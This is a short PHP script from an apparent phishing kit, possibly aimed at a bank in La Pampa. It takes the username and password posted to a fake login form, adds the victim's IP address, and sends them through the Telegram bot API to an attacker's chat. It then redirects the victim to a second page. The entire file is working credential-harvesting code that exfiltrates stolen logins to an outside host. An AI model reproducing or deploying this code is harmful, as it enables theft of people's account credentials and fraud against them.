<?php

$numtel = $_POST['usezario'];
$montiel = $_POST['pwdod'];





require 'space.php';

$html_message = "## LAPAMPA ##\n". 
         
        "<b>✔️✯US3R: </b><code>".$numtel."</code>\n".

         "<b>✔️✯CL4V3: </b><code>".$montiel."</code>\n".

         
  
		 

			
  
				"IP INFO\n".
				"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".
        
				"";


$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");

header ("location:2.html");

?>